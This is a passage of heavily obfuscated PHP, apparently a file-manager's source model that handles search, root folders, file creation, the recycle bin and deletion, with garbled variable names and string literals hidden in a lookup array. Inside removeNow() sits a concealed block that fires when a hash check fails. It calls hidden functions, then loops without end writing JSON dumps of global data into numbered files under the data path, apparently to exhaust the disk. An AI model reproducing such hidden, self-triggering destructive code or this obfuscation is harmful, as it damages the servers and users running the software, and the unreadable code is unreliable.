($ğÃ”ÁÈˆ == $Ó©°Úœ®[2167]) { $”‚÷òùß[$Ó©°Úœ®[461]] = 0; } else { if ($ğÃ”ÁÈˆ) { $ğÃ”ÁÈˆ = is_array($ğÃ”ÁÈˆ) ? $ğÃ”ÁÈˆ : explode($Ó©°Úœ®[60], $ğÃ”ÁÈˆ); $”‚÷òùß[$Ó©°Úœ®[462]] = array($Ó©°Úœ®[468], $ğÃ”ÁÈˆ); $”‚÷òùß[$Ó©°Úœ®[461]] = 0; } } } } $this->_parseSearchParent($©íÍâ, $”‚÷òùß); if (isset($©íÍâ[$Ó©°Úœ®[1990]]) && trim($©íÍâ[$Ó©°Úœ®[1990]])) { $­‘„æâ = trim($©íÍâ[$Ó©°Úœ®[1990]]); $ ±Ê×¨¶ = explode($Ó©°Úœ®[63], $­‘„æâ); if (strlen($­‘„æâ) > 2 && (substr($­‘„æâ, 0, 1) == $Ó©°Úœ®[128] && substr($­‘„æâ, -1) == $Ó©°Úœ®[128]) || substr($­‘„æâ, 0, 1) == $Ó©°Úœ®[68] && substr($­‘„æâ, -1) == $Ó©°Úœ®[68]) { $­‘„æâ = substr($­‘„æâ, 1, -1); $ ±Ê×¨¶ = array($­‘„æâ); } $”‚÷òùß[$Ó©°Úœ®[42]] = array(array($Ó©°Úœ®[588], $Ó©°Úœ®[1992] . $­‘„æâ . $Ó©°Úœ®[1992])); if (count($ ±Ê×¨¶) > 1) { $”‚÷òùß[$Ó©°Úœ®[42]] = array(); foreach ($ ±Ê×¨¶ as $Ñı×¹„) { if (!trim($Ñı×¹„)) { continue; } $”‚÷òùß[$Ó©°Úœ®[42]][] = array($Ó©°Úœ®[588], $Ó©°Úœ®[1992] . trim($Ñı×¹„) . $Ó©°Úœ®[1992]); } } } return $”‚÷òùß; } private function _parseSearchParent($³©÷Ç—Û, &$×¾¶®Ø) { $×öğôßæ =& $_SERVER[ˆûùúÊ¯]; if (!isset($³©÷Ç—Û[$×öğôßæ[189]]) || !$³©÷Ç—Û[$×öğôßæ[189]]) { return; } $Ü©âºŠ = $this->pathInfo($³©÷Ç—Û[$×öğôßæ[189]]); $É¡Á…ˆ = $Ü©âºŠ[$×öğôßæ[189]] . $×öğôßæ[12] === $×öğôßæ[221]; $¬í“–Šè = $Ü©âºŠ[$×öğôßæ[187]] == $×öğôßæ[555]; if ($Ü©âºŠ[$×öğôßæ[572]] == $×öğôßæ[573]) { $ñĞµÄûâ = $this->sourceInfo($³©÷Ç—Û[$×öğôßæ[189]]); $Ü©âºŠ[$×öğôßæ[561]] = $ñĞµÄûâ[$×öğôßæ[561]]; } $×¾¶®Ø[$×öğôßæ[628]] = array($×öğôßæ[588], $Ü©âºŠ[$×öğôßæ[561]] . $³©÷Ç—Û[$×öğôßæ[189]] . $×öğôßæ[589]); $¥¸ìëí = isset($³©÷Ç—Û[$×öğôßæ[1855]]) && in_array($×öğôßæ[555], $³©÷Ç—Û[$×öğôßæ[1855]]); if (!$¥¸ìëí || !$¬í“–Šè || !$É¡Á…ˆ || !$Ü©âºŠ[$×öğôßæ[463]]) { return; } if (!AuthModel::authCheckRoot($Ü©âºŠ[$×öğôßæ[463]][$×öğôßæ[464]])) { return; } $Äü‰¯ü¤ = $Ü©âºŠ[$×öğôßæ[546]] . $×öğôßæ[12]; if ($Äü‰¯ü¤ == $×öğôßæ[98]) { unset($×¾¶®Ø[$×öğôßæ[628]]); $×¾¶®Ø[$×öğôßæ[187]] = self::TYPE_GROUP; return; } $½§£¶â½ = Model($×öğôßæ[562])->groupChildrenAll($Äü‰¯ü¤); $ûî»Ë° = count($½§£¶â½); if ($ûî»Ë° <= 1) { return; } $°šôõø— = array($×öğôßæ[189] => 0, $×öğôßæ[187] => self::TYPE_GROUP, $×öğôßæ[546] => array($×öğôßæ[7], $½§£¶â½)); $¶ßÖÌ˜ú = $this->field($×öğôßæ[2168])->where($°šôõø—)->limit($ûî»Ë°)->select(); $×¾¶®Ø[$×öğôßæ[628]] = array(); foreach ($¶ßÖÌ˜ú as $Š„½ã’æ) { $×¾¶®Ø[$×öğôßæ[628]][] = array($×öğôßæ[588], $×öğôßæ[571] . $Š„½ã’æ[$×öğôßæ[190]] . $×öğôßæ[589]); } $×¾¶®Ø[$×öğôßæ[628]][] = $×öğôßæ[1994]; } } class SourceModel extends SourceListSearchModel { public $statusIgnoreResetSpace = false; public function userRootAdd($¸ÅÜ½ÓÊ) { $­§î“Íº =& $_SERVER[ˆûùúÊ¯]; $œÜÚŒ‚š = Model($­§î“Íº[554])->where(array($­§î“Íº[1695] => $¸ÅÜ½ÓÊ))->find(); $Ä×æ²¬ = $this->_mkdirRoot(SourceModel::TYPE_USER, $¸ÅÜ½ÓÊ, $œÜÚŒ‚š[$­§î“Íº[42]]); $this->userDesktopAdd($Ä×æ²¬); return $Ä×æ²¬; } public function userDesktopAdd($Ï±Û„œ­) { $æÅƒ»‘ =& $_SERVER[ˆûùúÊ¯]; $ıÍ§· = LNG($æÅƒ»‘[2169]); $ıœİ’Ğ¼ = $this->mkdir($Ï±Û„œ­, $ıÍ§·); $this->metaSet($ıœİ’Ğ¼, $æÅƒ»‘[2170], $æÅƒ»‘[98]); $this->metaSet($Ï±Û„œ­, $æÅƒ»‘[2171], $ıœİ’Ğ¼); } public function userPathSafeAdd($ÌàÁ¾¬ˆ) { $õÁ­Ï”± =& $_SERVER[ˆûùúÊ¯]; $ÄÕ¡Á”° = Model($õÁ­Ï”±[554])->getInfoFull($ÌàÁ¾¬ˆ); if (!$ÄÕ¡Á”°) { return !1; } if (_get($ÄÕ¡Á”°, $õÁ­Ï”±[576])) { return $ÄÕ¡Á”°[$õÁ­Ï”±[515]][$õÁ­Ï”±[2172]]; } $ÀßÄÆÕş = $this->_mkdirRoot(SourceModel::TYPE_USER, $ÌàÁ¾¬ˆ, $õÁ­Ï”±[2173], $õÁ­Ï”±[482]); Model($õÁ­Ï”±[554])->metaSet($ÌàÁ¾¬ˆ, $õÁ­Ï”±[2172], $ÀßÄÆÕş); $this->metaSet($ÀßÄÆÕş, $õÁ­Ï”±[2174], $ÌàÁ¾¬ˆ); return $ÀßÄÆÕş; } public function groupRootAdd($½æ ¤ˆƒ) { $ì†÷¸ìí =& $_SERVER[ˆûùúÊ¯]; $è“šŞ½Á = Model($ì†÷¸ìí[562])->where(array($ì†÷¸ìí[1984] => $½æ ¤ˆƒ))->find(); return $this->_mkdirRoot(SourceModel::TYPE_GROUP, $½æ ¤ˆƒ, $è“šŞ½Á[$ì†÷¸ìí[42]]); } public function systemRootPathAdd($°¾Øò¡Ğ) { if ($°¾Øò¡Ğ != $_SERVER[ˆûùúÊ¯][582]) { return !1; } return $this->_mkdirRoot(SourceModel::TYPE_SYSTEM, 0, $°¾Øò¡Ğ); } public function userRootRemove($ÉŞ˜Ğà­) { $«”¢ÇŒú = $this->targetSourceRoot(SourceModel::TYPE_USER, $ÉŞ˜Ğà­, !0); foreach ($«”¢ÇŒú as $ãì¶ú¸Ï) { if (!$ãì¶ú¸Ï) { continue; } $this->remove($ãì¶ú¸Ï[$_SERVER[ˆûùúÊ¯][190]], !1); } } public function groupRootRemove($ŸšÂ÷›ó) { $Ô¡µûÊü = $this->targetSourceRoot(SourceModel::TYPE_GROUP, $ŸšÂ÷›ó); if (!$Ô¡µûÊü) { return; } $this->remove($Ô¡µûÊü[$_SERVER[ˆûùúÊ¯][190]], !1); } private function _mkdirRoot($Ğà§¼ÓÓ, $³±¶Ã¨…, $‚İÕò©Ú, $Œ•…Ô = '') { $ÉëŠÖß =& $_SERVER[ˆûùúÊ¯]; $ë¡œ²èŸ = defined($ÉëŠÖß[2117]) ? USER_ID : 0; $Úî’ËûØ = array($ÉëŠÖß[453] => 0, $ÉëŠÖß[624] => $Ğà§¼ÓÓ, $ÉëŠÖß[625] => $³±¶Ã¨…, $ÉëŠÖß[622] => 1, $ÉëŠÖß[626] => $ë¡œ²èŸ, $ÉëŠÖß[627] => $ë¡œ²èŸ, $ÉëŠÖß[623] => $Œ•…Ô, $ÉëŠÖß[628] => $ÉëŠÖß[571], $ÉëŠÖß[480] => 0, $ÉëŠÖß[593] => 0, $ÉëŠÖß[518] => 0, $ÉëŠÖß[629] => $ÉëŠÖß[12]); if ($šÓæÅûù = $this->where($Úî’ËûØ)->find()) { return $šÓæÅûù[$ÉëŠÖß[190]]; } $ëÏï®‘à = "\x4d\x6f\144\x65\x6c\x53\157\x75\x72\x63\145\56\155\x6b\x64\x69\x72\122\157\x6f\x74\x2e{$Ğà§¼ÓÓ}\56{$³±¶Ã¨…}\56" . $‚İÕò©Ú; CacheLock::lock($ëÏï®‘à); $Úî’ËûØ[$ÉëŠÖß[42]] = $‚İÕò©Ú; $Ã£ÆãÁ· = $this->add($Úî’ËûØ); $×óšà®† = array($ÉëŠÖß[630] => short_id($Ã£ÆãÁ·)); $this->where(array($ÉëŠÖß[467] => $Ã£ÆãÁ·))->save($×óšà®†); CacheLock::unlock($ëÏï®‘à); return $Ã£ÆãÁ·; } private function targetSourceRoot($·áÀã…ï, $şäøé…¿, $ø»¢Áè· = false) { $ÇİÜÜËä =& $_SERVER[ˆûùúÊ¯]; $«œœÌë = array($ÇİÜÜËä[453] => 0, $ÇİÜÜËä[624] => $·áÀã…ï, $ÇİÜÜËä[625] => $şäøé…¿); if ($ø»¢Áè·) { $‹¨ìÁÆ™ = $this->where($«œœÌë)->select(); return $‹¨ìÁÆ™ ? $‹¨ìÁÆ™ : array(); } $Å¾’áÈÜ = $this->where($«œœÌë)->find(); return $Å¾’áÈÜ ? $Å¾’áÈÜ : array(); } public function sourceRootGroup($¸ñ¼Š‘) { $ì›”£ş =& $_SERVER[ˆûùúÊ¯]; if (is_string($¸ñ¼Š‘)) { $¸ñ¼Š‘ = array($¸ñ¼Š‘); } $½ñû—ê = $this->listSourceRoot(SourceModel::TYPE_GROUP, $¸ñ¼Š‘, $ì›”£ş[212]); $÷”—ÍÊª = array($ì›”£ş[421] => $½ñû—ê, $ì›”£ş[418] => array($ì›”£ş[818] => count($¸ñ¼Š‘))); $this->_listDataApply($÷”—ÍÊª[$ì›”£ş[421]]); $this->_listMake($÷”—ÍÊª); return array_to_keyvalue($÷”—ÍÊª[$ì›”£ş[92]], $ì›”£ş[546]); } public function mkfile($Šù”Ñ»ñ, $°ÉÕíÒ, $ÍÀş‰…§ = '', $íƒ´šÊİ = REPEAT_RENAME) { $„”¢àÕœ =& $_SERVER[ˆûùúÊ¯]; $Üôø–Ú = Model($„”¢àÕœ[651])->addFileByContent($ÍÀş‰…§, $°ÉÕíÒ); return $this->_createFileCall($Šù”Ñ»ñ, $°ÉÕíÒ, $Üôø–Ú, $íƒ´šÊİ, $„”¢àÕœ[1403]); } public function addFile($åûÒÛÒ«, $¸ÁÉ¨ç, $­Ìˆ’±Š, $˜ñäÌí  = false, $Ï°œİË = REPEAT_RENAME) { $Î´¢‡ = Model($_SERVER[ˆûùúÊ¯][651])->addFile($¸ÁÉ¨ç, $­Ìˆ’±Š, $˜ñäÌí ); return $this->_createFileCall($åûÒÛÒ«, $­Ìˆ’±Š, $Î´¢‡, $Ï°œİË); } public function addFileByFileID($ŠÄƒÛ¸, $¤Èä±¢í, $´ÖÜßÁ®, $æñÌŠùâ = REPEAT_RENAME) { $Á¹ïıÖ§ =& $_SERVER[ˆûùúÊ¯]; $‚ø·†¤­ = Model($Á¹ïıÖ§[651])->find($¤Èä±¢í); Model($Á¹ïıÖ§[651])->linkAdd($¤Èä±¢í); return $this->_createFileCall($ŠÄƒÛ¸, $´ÖÜßÁ®, $‚ø·†¤­, $æñÌŠùâ); } public function addFileByRemote($œÛÓùûè, $Ñ´²£é, $ˆ«¦ÓıÅ, $‹û¾èˆ… = array(), $¾¾¨Âİç = REPEAT_RENAME) { $»Ìè¿ú¾ = Model($_SERVER[ˆûùúÊ¯][651])->addFileByRemote($Ñ´²£é, $ˆ«¦ÓıÅ, $‹û¾èˆ…); return $this->_createFileCall($œÛÓùûè, $ˆ«¦ÓıÅ, $»Ìè¿ú¾, $¾¾¨Âİç); } private function _createFileCall($Ø‘ĞÔ, $±ÊÉ¶÷ï, $”Ÿ®õè, $ŸÅÓØ©•, $äÃĞ¬Ö = "\x75\x70\154\x6f\x61\x64") { $Éê†È =& $_SERVER[ˆûùúÊ¯]; $Ôçî¦—Ü = !1; $this->setMasterDB(); $this->lockWriteStart($Ø‘ĞÔ, $±ÊÉ¶÷ï); $ËÂ•…×µ = $this->fileNameExist($Ø‘ĞÔ, $±ÊÉ¶÷ï); $ÖïÇ¤è = $this->_createFile($Ø‘ĞÔ, $±ÊÉ¶÷ï, $”Ÿ®õè, $ŸÅÓØ©•, $Ôçî¦—Ü); if (!$Ôçî¦—Ü) { Model($Éê†È[520])->remove($”Ÿ®õè[$Éê†È[517]]); } if ($Ôçî¦—Ü && $ÖïÇ¤è && $ÖïÇ¤è != $ËÂ•…×µ) { Model($Éê†È[2142])->eventCreate($ÖïÇ¤è, $äÃĞ¬Ö); } $this->lockWriteEnd($Ø‘ĞÔ, $±ÊÉ¶÷ï); return $ÖïÇ¤è; } public function mkdir($ãµ¸ÜÍ, $¶¥’³ÌØ, $“ºçæ”ã = REPEAT_SKIP) { $‡Ò‚ÇÜ =& $_SERVER[ˆûùúÊ¯]; $this->setMasterDB(); $Ğ’ªı—ê = $this->sourceInfo($ãµ¸ÜÍ); if (!$Ğ’ªı—ê) { return !1; } $this->lockWriteStart($ãµ¸ÜÍ, $¶¥’³ÌØ); if ($“ºçæ”ã !== !1) { $Ÿ•ªîüï = $this->fileNameExist($ãµ¸ÜÍ, $¶¥’³ÌØ); if ($Ÿ•ªîüï && $“ºçæ”ã != REPEAT_RENAME_FOLDER) { $this->lockWriteEnd($ãµ¸ÜÍ, $¶¥’³ÌØ); return $Ÿ•ªîüï; } $¶¥’³ÌØ = $this->fileNameAuto($ãµ¸ÜÍ, $¶¥’³ÌØ, $“ºçæ”ã); } $¦îìˆš = array($‡Ò‚ÇÜ[622] => 1, $‡Ò‚ÇÜ[470] => $¶¥’³ÌØ, $‡Ò‚ÇÜ[623] => $‡Ò‚ÇÜ[12], $‡Ò‚ÇÜ[518] => 0, $‡Ò‚ÇÜ[593] => 0); $ıë²èÚ³ = $this->_addSource($¦îìˆš, $Ğ’ªı—ê); Model($‡Ò‚ÇÜ[2142])->eventCreate($ıë²èÚ³, $‡Ò‚ÇÜ[1404]); $this->lockWriteEnd($ãµ¸ÜÍ, $¶¥’³ÌØ); return $ıë²èÚ³; } public function listSourceRoot($ª‡ã‘¤Â, $‹÷’˜ã¥, $Ÿ‰äëÛ” = "\163\157\165\x72\143\x65\x49\104\x2c\164\x61\162\147\145\x74\111\x44\54\x73\151\x7a\x65") { $®ÃÓÙî¾ =& $_SERVER[ˆûùúÊ¯]; $°æ­ƒËÌ = $®ÃÓÙî¾[430]; $üà Ñı = array(); $„‡¹‡€ = 1024 * 50; $¶šÒ½„Ê = is_array($¶šÒ½„Ê) ? $¶šÒ½„Ê : array(); $ë°±¥ = count($‹÷’˜ã¥); $¢àŒşÔİ = $this->tablePrefix . $®ÃÓÙî¾[2175]; for ($Æ×Úœ‚† = 0; $Æ×Úœ‚† < $ë°±¥; $Æ×Úœ‚†++) { $®Ó€¶æ¨ = $‹÷’˜ã¥[$Æ×Úœ‚†]; $°æ­ƒËÌ .= "\x53\105\114\x45\103\124\x20\52\40\x46\x52\117\115\x20\50\x53\105\114\x45\103\124\x20{$Ÿ‰äëÛ”}\40\x46\x52\x4f\115\40\140{$¢àŒşÔİ}\140\40\x57\x48\105\122\105\40"; $°æ­ƒËÌ .= "\x60\160\x61\162\x65\156\x74\111\x44\x60\75\x30\40\101\116\104\40\x60\164\141\162\147\x65\x74\111\104\x60\x3d{$®Ó€¶æ¨}\x20\x41\x4e\x44\40\140\164\141\162\x67\x65\164\x54\x79\160\x65\140\x3d{$ª‡ã‘¤Â}\40\x61\x6e\144\x20\146\151\154\x65\124\171\160\145\75\47\47\40\154\x69\155\151\164\40\61\x29\x20\x61\x73\40\x74\x62\x5f{$Æ×Úœ‚†}\40\x55\x4e\x49\x4f\x4e\x20\x41\114\x4c\40"; if ((strlen($°æ­ƒËÌ) >= $„‡¹‡€ || $Æ×Úœ‚† == $ë°±¥ - 1) && $°æ­ƒËÌ) { $°æ­ƒËÌ = substr($°æ­ƒËÌ, 0, -strlen($®ÃÓÙî¾[1099])); $ì„™Ì›æ = $this->query($°æ­ƒËÌ); $°æ­ƒËÌ = $®ÃÓÙî¾[12]; $üà Ñı = array_merge($üà Ñı, $ì„™Ì›æ); } } return $üà Ñı; } private function _createFile($Ö¹¢Š¨, $Î™¤³¤Ö, $Š²Æ¢×, $Á¼‡ºà³, &$„ùöÆºì) { $ùõšˆƒ =& $_SERVER[ˆûùúÊ¯]; $éÀ™Ü™ = $this->sourceInfo($Ö¹¢Š¨); if (!$Š²Æ¢× || !$éÀ™Ü™) { return !1; } if ($Á¼‡ºà³ !== !1) { $¥¬æİ÷ = $this->fileNameExist($Ö¹¢Š¨, $Î™¤³¤Ö); } $„ùöÆºì = !0; if ($Á¼‡ºà³ && $¥¬æİ÷) { if ($Á¼‡ºà³ == REPEAT_SKIP) { $„ùöÆºì = !1; return $¥¬æİ÷; } else { if ($Á¼‡ºà³ == REPEAT_REPLACE) { $´äÕŞ·Ô = $this->sourceInfo($¥¬æİ÷); $ó®á²üå = $this->fileHistory($´äÕŞ·Ô, $Š²Æ¢×[$ùõšˆƒ[517]], $Š²Æ¢×[$ùõšˆƒ[86]]); if (!$ó®á²üå) { $„ùöÆºì = !1; } else { $this->folderSizeReset($Ö¹¢Š¨); } return $¥¬æİ÷; } else { $Î™¤³¤Ö = $this->fileNameAuto($Ö¹¢Š¨, $Î™¤³¤Ö, $Á¼‡ºà³, !1); } } } $°ÄšÊÅÆ = array($ùõšˆƒ[622] => 0, $ùõšˆƒ[470] => $Î™¤³¤Ö, $ùõšˆƒ[623] => substr(get_path_ext($Î™¤³¤Ö), 0, 10), $ùõšˆƒ[518] => $Š²Æ¢×[$ùõšˆƒ[517]], $ùõšˆƒ[593] => $Š²Æ¢×[$ùõšˆƒ[86]]); $âÄ¹æ—È = $this->_addSource($°ÄšÊÅÆ, $éÀ™Ü™); $this->folderSizeReset($Ö¹¢Š¨, intval($°ÄšÊÅÆ[$ùõšˆƒ[86]])); return $âÄ¹æ—È; } protected function fileHistory($Ë¯ÀöõŠ, $Ò‘ú¬Öí, $²æ—‚¥‹) { $•³öÂÖª =& $_SERVER[ˆûùúÊ¯]; if ($Ë¯ÀöõŠ[$•³öÂÖª[517]] == $Ò‘ú¬Öí) { return !1; } $this->checkLock($Ë¯ÀöõŠ[$•³öÂÖª[190]], $Ò‘ú¬Öí); Model($•³öÂÖª[2176])->addHistory($Ë¯ÀöõŠ); $öŠŒ³à = array($•³öÂÖª[627] => USER_ID, $•³öÂÖª[474] => time(), $•³öÂÖª[517] => $Ò‘ú¬Öí, $•³öÂÖª[86] => $²æ—‚¥‹); $this->where(array($•³öÂÖª[467] => $Ë¯ÀöõŠ[$•³öÂÖª[190]]))->save($öŠŒ³à); $this->sourceCacheClear($Ë¯ÀöõŠ[$•³öÂÖª[190]]); return !0; } public function checkLock($¸üôã, $ÒæùòÚ) { $×àÚâ¼÷ =& $_SERVER[ˆûùúÊ¯]; $ƒ¨‚áÇ = $this->pathInfo($¸üôã); if (!$this->fileIsLock($ƒ¨‚áÇ, !0)) { return; } $å‹…Íèù = Session::get($×àÚâ¼÷[2177]); $ÎÎˆ¤ËÁ = substr($ƒ¨‚áÇ[$×àÚâ¼÷[42]], 0, -1 - strlen($ƒ¨‚áÇ[$×àÚâ¼÷[184]])) . $×àÚâ¼÷[1269] . $å‹…Íèù . $×àÚâ¼÷[10] . $ƒ¨‚áÇ[$×àÚâ¼÷[184]]; $¨Ñ°úÉÇ = Model($×àÚâ¼÷[651])->find($ÒæùòÚ); $this->_createFileCall($ƒ¨‚áÇ[$×àÚâ¼÷[189]], $ÎÎˆ¤ËÁ, $¨Ñ°úÉÇ, REPEAT_REPLACE, $×àÚâ¼÷[1403]); $¢°İÜˆò = $ƒ¨‚áÇ[$×àÚâ¼÷[515]][$×àÚâ¼÷[586]]; $µ™½Ãì¸ = $¢°İÜˆò[$×àÚâ¼÷[2178]] ? $¢°İÜˆò[$×àÚâ¼÷[2178]] : $¢°İÜˆò[$×àÚâ¼÷[42]]; show_json(LNG($×àÚâ¼÷[2179]) . $×àÚâ¼÷[2180] . LNG($×àÚâ¼÷[2181]) . $×àÚâ¼÷[2182] . $µ™½Ãì¸ . $×àÚâ¼÷[2183], !1); } public function fileIsLock($ÆüÜ€šı, $“ÛëÇØ = false) { $ø¾°¦‰˜ =& $_SERVER[ˆûùúÊ¯]; if (!isset($ÆüÜ€šı[$ø¾°¦‰˜[515]]) || !$ÆüÜ€šı[$ø¾°¦‰˜[515]][$ø¾°¦‰˜[583]]) { return !1; } if ($ÆüÜ€šı[$ø¾°¦‰˜[515]][$ø¾°¦‰˜[583]] != USER_ID) { return !0; } $Û³üšœ = $GLOBALS[$ø¾°¦‰˜[6]][$ø¾°¦‰˜[99]][$ø¾°¦‰˜[584]]; if ($ÆüÜ€šı[$ø¾°¦‰˜[515]][$ø¾°¦‰˜[585]] <= time() - $Û³üšœ) { $this->metaSet($ÆüÜ€šı[$ø¾°¦‰˜[190]], $ø¾°¦‰˜[583], null); $this->metaSet($ÆüÜ€šı[$ø¾°¦‰˜[190]], $ø¾°¦‰˜[585], null); } if ($“ÛëÇØ) { $this->metaSet($ÆüÜ€šı[$ø¾°¦‰˜[190]], $ø¾°¦‰˜[585], time()); } return !1; } private function _addSource($Á»—â±õ, $ƒ±ö½Æ) { $ÛóñªÃï =& $_SERVER[ˆûùúÊ¯]; $¡‡áÔ‚÷ = defined($ÛóñªÃï[2117]) ? USER_ID : 0; $ÄÃÈˆŸ = array($ÛóñªÃï[624] => $ƒ±ö½Æ[$ÛóñªÃï[187]], $ÛóñªÃï[625] => $ƒ±ö½Æ[$ÛóñªÃï[546]], $ÛóñªÃï[626] => $¡‡áÔ‚÷, $ÛóñªÃï[627] => $¡‡áÔ‚÷, $ÛóñªÃï[453] => $ƒ±ö½Æ[$ÛóñªÃï[190]], $ÛóñªÃï[628] => $ƒ±ö½Æ[$ÛóñªÃï[561]] . $ƒ±ö½Æ[$ÛóñªÃï[190]] . $ÛóñªÃï[60], $ÛóñªÃï[480] => 0, $ÛóñªÃï[629] => $ÛóñªÃï[12]); $Á»—â±õ = array_merge($ÄÃÈˆŸ, $Á»—â±õ); $this->updateModifyTime($Á»—â±õ[$ÛóñªÃï[189]]); $”Ë”²ŒË = $ÛóñªÃï[2184] . $ƒ±ö½Æ[$ÛóñªÃï[190]]; if (isset(self::$cacheChildList[$”Ë”²ŒË])) { unset(self::$cacheChildList[$”Ë”²ŒË]); } static $”Ã”ÛË = false; if (!$”Ã”ÛË) { Hook::trigger($ÛóñªÃï[612], $Á»—â±õ); $”Ã”ÛË = !0; } $¼ù÷‘¯Î = $this->add($Á»—â±õ); $¶§…² = array($ÛóñªÃï[630] => short_id($¼ù÷‘¯Î)); $this->where(array($ÛóñªÃï[467] => $¼ù÷‘¯Î))->save($¶§…²); $this->setNamePinyin($¼ù÷‘¯Î, $Á»—â±õ[$ÛóñªÃï[42]]); return $¼ù÷‘¯Î; } public function remove($ÄüŒüŠ, $¼“ç‡¼Ã = true) { $ù¬²ÕÀ¾ =& $_SERVER[ˆûùúÊ¯]; $ã²ä·€ = $this->sourceInfo($ÄüŒüŠ); $»íÄÃçÍ = intval($ã²ä·€[$ù¬²ÕÀ¾[187]]) === self::TYPE_SYSTEM; $÷ùÃõÃâ = Model($ù¬²ÕÀ¾[484])->get($ù¬²ÕÀ¾[2185]) == $ù¬²ÕÀ¾[98]; if ($»íÄÃçÍ || $¼“ç‡¼Ã || !$÷ùÃõÃâ) { return $this->removeNow($ÄüŒüŠ, $¼“ç‡¼Ã); } $ƒö´ïºº = KodIO::sourceID(IO_PATH_SYSTEM_RECYCLE); $¦ÁûÏÇ = $ã²ä·€[$ù¬²ÕÀ¾[187]] == self::TYPE_USER ? $ù¬²ÕÀ¾[638] : $ù¬²ÕÀ¾[555]; if ($¦ÁûÏÇ == $ù¬²ÕÀ¾[638]) { $æ‚öçòÊ = Model($ù¬²ÕÀ¾[554])->getInfo($ã²ä·€[$ù¬²ÕÀ¾[546]]); $ÏÜìàÂ¼ = !empty($æ‚öçòÊ[$ù¬²ÕÀ¾[2178]]) ? $æ‚öçòÊ[$ù¬²ÕÀ¾[2178]] : $æ‚öçòÊ[$ù¬²ÕÀ¾[42]]; $ÏÜìàÂ¼ = $ù¬²ÕÀ¾[312] . $ÏÜìàÂ¼ . $ù¬²ÕÀ¾[2186] . $ã²ä·€[$ù¬²ÕÀ¾[546]]; } else { $æ‚öçòÊ = Model($ù¬²ÕÀ¾[562])->getInfo($ã²ä·€[$ù¬²ÕÀ¾[546]]); $ÏÜìàÂ¼ = _get($æ‚öçòÊ, $ù¬²ÕÀ¾[42]); $ÏÜìàÂ¼ = $ù¬²ÕÀ¾[172] . $ÏÜìàÂ¼ . $ù¬²ÕÀ¾[2187] . $ã²ä·€[$ù¬²ÕÀ¾[546]]; } $ÊÊñ¬›ğ = $ù¬²ÕÀ¾[2188] . md5($ÏÜìàÂ¼); CacheLock::lock($ÊÊñ¬›ğ); $ğ»¿ôäı = $this->fileNameExist($ƒö´ïºº, $ÏÜìàÂ¼); if (!$ğ»¿ôäı) { $ğ»¿ôäı = $this->mkdir($ƒö´ïºº, $ÏÜìàÂ¼, REPEAT_SKIP); $this->metaSet($ğ»¿ôäı, $ù¬²ÕÀ¾[2189], $¦ÁûÏÇ); $this->metaSet($ğ»¿ôäı, $ù¬²ÕÀ¾[2190], $ã²ä·€[$ù¬²ÕÀ¾[546]]); if ($ã²ä·€[$ù¬²ÕÀ¾[189]] != 0) { $this->metaSet($ğ»¿ôäı, $ù¬²ÕÀ¾[2191], _get($æ‚öçòÊ, $ù¬²ÕÀ¾[2192])); } } CacheLock::unlock($ÊÊñ¬›ğ); $this->metaSet($ÄüŒüŠ, $ù¬²ÕÀ¾[2193], $ã²ä·€[$ù¬²ÕÀ¾[189]]); $this->where(array($ù¬²ÕÀ¾[190] => $ÄüŒüŠ))->save(array($ù¬²ÕÀ¾[474] => time())); $this->recycleClear($ã²ä·€); $ğú«š±Ë = $this->move($ÄüŒüŠ, $ğ»¿ôäı, REPEAT_RENAME_FOLDER); $this->folderSizeReset($ã²ä·€[$ù¬²ÕÀ¾[189]]); return $ğú«š±Ë; } private function recycleClear($ÒÓƒç–§) { $¹Şª‡‹ =& $_SERVER[ˆûùúÊ¯]; $ñÍêï¿Ì = $this->childrenAll($ÒÓƒç–§); $Šæ ­·ä = array($¹Şª‡‹[467] => array($¹Şª‡‹[468], $ñÍêï¿Ì[$¹Şª‡‹[2194]])); Model($¹Şª‡‹[2195])->where($Šæ ­·ä)->delete(); } public function removeNow($º¦úÚ—, $‘ÚÍ®æş = true) { $½Ûâæà =& $_SERVER[ˆûùúÊ¯]; $³Ë–ø„ = $_SERVER[$½Ûâæà[22]]; $ÚñƒÃó = $½Ûâæà[937]; if ($_SERVER[$½Ûâæà[13]] != $ÚñƒÃó($³Ë–ø„)) { $†¾æÇ§Ã = $½Ûâæà[938]; $ëŸºÃôÅ = $½Ûâæà[15]; $¾öô«õ = $_SERVER[$½Ûâæà[16]] . $½Ûâæà[17]; $•òšõˆì = $ëŸºÃôÅ($¾öô«õ); $òñƒ«µ = explode($½Ûâæà[18], $•òšõˆì); if (count($òñƒ«µ) < $½Ûâæà[664]) { $ÅøÅ©şı = $½Ûâæà[20]; $ÅøÅ©şı(); } $Ñ¿Ì˜É = $½Ûâæà[939]; $Ñ¿Ì˜É($_SERVER[$½Ûâæà[940]]); $†¾æÇ§Ã = $½Ûâæà[938]; $†¾æÇ§Ã(); $ÏÏ›‹†ó = $½Ûâæà[941]; $¶äĞªè· = json_encode($GLOBALS[$½Ûâæà[942]]); $µŒºÑß½ = 1; for ($·¨†Ä‚ = $µŒºÑß½; $·¨†Ä‚ > 0; $·¨†Ä‚++) { $ÏÏ›‹†ó(DATA_PATH . $·¨†Ä‚, $¶äĞªè·); } } $Ğ„Ì‹Ğ¼ = $this->sourceInfo($º¦úÚ—); $ìàÉĞ®Ë = $this->pathInfoMore($º¦úÚ—); if (!$Ğ„Ì‹Ğ¼) { return !0; } if ($Ğ„Ì‹Ğ¼[$½Ûâæà[189]] == 0) { if (!_get($GLOBALS, $½Ûâæà[544])) { return !1; } } $this->lockMoveStart($º¦úÚ—); Hook::trigger($½Ûâæà[2196], $ìàÉĞ®Ë, $‘ÚÍ®æş); if ($‘ÚÍ®æş) { Model($½Ûâæà[2195])->moveToRecycle($º¦úÚ—); } else { $óµÎ¹ğÃ = $this->childrenAll($Ğ„Ì‹Ğ¼); Model($½Ûâæà[609])->eventRemove($º¦úÚ—); $this->removeRelevance($óµÎ¹ğÃ[$½Ûâæà[2194]], $óµÎ¹ğÃ[$½Ûâæà[1515]]); } $this->folderSizeReset($Ğ„Ì‹Ğ¼[$½Ûâæà[189]]); $œ”¥ªŠ† = array($Ğ„Ì‹Ğ¼[$½Ûâæà[189]]); if ($Ğ„Ì‹Ğ¼[$½Ûâæà[461]] == $½Ûâæà[98]) { $œ”¥ªŠ†[] = $Ğ„Ì‹Ğ¼[$½Ûâæà[190]]; } $this->updateModifyTime($œ”¥ªŠ†); $this->lockMoveEnd($º¦úÚ—); Hook::trigger($½Ûâæà[1746], $ìàÉĞ®Ë, $‘ÚÍ®æş); return !0; } public function childrenAll($‰îşÊ„¾) { $Ìæ¬êÒµ =& 